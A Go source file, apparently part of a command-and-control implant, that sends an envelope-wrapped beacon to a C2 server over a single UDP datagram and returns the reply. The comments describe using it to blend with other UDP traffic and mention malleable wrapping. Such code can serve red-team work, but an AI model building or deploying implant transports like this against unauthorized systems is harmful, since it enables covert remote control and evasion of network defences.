//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"net"
	"time"
)

// sendUDPBeacon sends the (already envelope-wrapped) beacon payload as a single
// UDP datagram to the C2 endpoint and reads one response datagram. It provides
// a low-overhead, connectionless beacon transport for environments where UDP
// egress is permitted (or to blend with other UDP traffic). The server must
// expose a matching UDP listener that understands the same v2 envelope framing.
//
// Fragmentation/ordering are the caller's concern: the payload is sent in one
// datagram, so keep it within the link MTU; larger results must use a
// connection-oriented transport.
func sendUDPBeacon(body []byte) []byte {
	hostPort, scheme, ok := currentC2Dial()
	if !ok || (scheme != "" && scheme != "udp") {
		if Debug {
			fmt.Printf("[!] UDP beacon: no udp:// endpoint configured (scheme=%s)\n", scheme)
		}
		return nil
	}

	addr, err := net.ResolveUDPAddr("udp", hostPort)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: resolve %s failed: %v\n", hostPort, err)
		}
		return nil
	}

	conn, err := net.DialUDP("udp", nil, addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: dial %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := conn.SetDeadline(time.Now().Add(15 * time.Second)); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
		}
		return nil
	}

	rbuf := make([]byte, 16*1024*1024)
	n, _, err := conn.ReadFromUDP(rbuf)
	if err != nil {
		if Debug {
			fmt.Printf("[!] UDP beacon: read failed: %v\n", err)
		}
		return nil
	}
	if n == 0 {
		return nil
	}
	// The server answers with a raw (optionally malleable-wrapped) envelope;
	// mirror the TCP transport and return it verbatim.
	return rbuf[:n]
}
